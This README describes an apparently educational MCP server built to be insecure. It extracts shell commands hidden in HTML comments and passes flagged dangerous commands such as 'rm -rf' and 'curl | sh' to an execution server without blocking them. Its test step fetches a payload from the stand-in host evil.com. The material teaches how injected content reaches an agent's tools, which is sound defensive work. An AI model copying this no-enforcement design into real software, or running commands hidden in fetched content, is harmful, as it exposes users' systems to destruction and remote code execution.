# Server 2: Processing Server

Educational MCP server demonstrating weak validation in content processing.

## Purpose

Parses markdown and HTML to extract code blocks and commands, but **fails to properly validate or block dangerous content**. This is the second link in the vulnerability chain.

## Vulnerabilities

### 1. HTML Comment Parsing
- Extracts code blocks from HTML comments: `<!-- ```bash ... ``` -->`
- This is where attackers hide payloads in "normal-looking" HTML
- No stripping of comments before parsing

### 2. No Command Blocking
- Identifies dangerous commands (rm -rf, curl | sh, eval, etc.)
- **Flags them with risk levels**
- **But allows them through anyway**
- No user approval required

### 3. No Content Sanitization
- Accepts raw content from Server 1 without validation
- Doesn't strip or escape dangerous characters
- Processes whatever is given

### 4. Risk Analysis Without Enforcement
- Analyzes: safe < low < medium < high < critical
- Logs warnings for high/critical commands
- **Does nothing to prevent execution**

## Tools

### `parse_markdown`

Parses markdown/HTML and extracts code blocks.

**Arguments:**
```json
{
  "content": "string (raw text/HTML)"
}
```

**Returns:**
```json
{
  "blocks": [
    {
      "type": "code_block",
      "language": "bash",
      "code": "command here",
      "source": "html_comment | markdown | inline"
    }
  ],
  "count": 3,
  "timestamp": "ISO 8601"
}
```

**Extraction Sources:**
- HTML comments: `<!-- ```lang\ncode\n``` -->`
- Markdown fences: ` ```lang\ncode\n``` `
- Inline code starting with `$` or `#`

### `extract_commands`

Extracts shell commands from code blocks with risk analysis.

**Arguments:**
```json
{
  "blocks": [CodeBlock]
}
```

**Returns:**
```json
{
  "commands": [
    {
      "code": "rm -rf /tmp/file",
      "language": "bash",
      "risk": "high",
      "flags": ["recursive_delete"],
      "source": "html_comment"
    }
  ],
  "count": 1,
  "riskBreakdown": {
    "safe": 0,
    "low": 0,
    "medium": 0,
    "high": 1,
    "critical": 0
  },
  "warning": "Dangerous commands detected but not blocked"
}
```

**Risk Flags:**
- `recursive_delete_root` (critical)
- `recursive_delete` (high)
- `disk_operation` (critical)
- `remote_execution` (critical)
- `eval` (high)
- `privilege_escalation` (high)
- Many more...

## Build & Run

```bash
# Install dependencies
npm install

# Build
npm run build

# Development mode
npm run dev

# Production mode
npm start
```

## Testing

Test with payload from Server 1:

```bash
# Get malicious content from Server 1
echo '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"fetch_content","arguments":{"url":"http://evil.com/malicious"}}}' \
  | node ../01-unsafe-input-server/dist/index.js 2>/dev/null \
  | jq -r '.result.content[0].text' \
  > /tmp/server1-output.json

# Parse it with Server 2
CONTENT=$(cat /tmp/server1-output.json | jq -r '.content')
echo "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"parse_markdown\",\"arguments\":{\"content\":$CONTENT}}}" \
  | node dist/index.js
```

## Attack Flow Position

```
Server 1          Server 2            Server 3
(Fetch)     -->   (Process)    -->    (Execute)
  |                  |                   |
No validation    Weak validation    Accepts from #2
  |                  |                   |
  └──────────────────┴───────────────────┘
            Vulnerability Chain
```

## The Critical Flaw

This server demonstrates the **"trust boundary violation"**:

1. **Trusts input from Server 1** without re-validation
2. **Analyzes risk but doesn't act on it**
3. **Passes dangerous commands to Server 3**
4. Assumes Server 3 will validate (it doesn't!)

In secure systems, **every layer must validate**.

## Security Lessons

1. **Defense in Depth**: Don't rely on upstream validation
2. **Policy Enforcement**: Risk analysis is useless without blocking
3. **User Approval**: High-risk operations need human confirmation
4. **Content Sanitization**: Strip dangerous content before processing
5. **Fail Secure**: When in doubt, block

## Secured Version

See `servers-secured/02-processing-server` for hardened implementation with:
- Command blocklist enforcement
- User approval for risky commands
- Shell metacharacter escaping
- Command length limits
- Audit logging
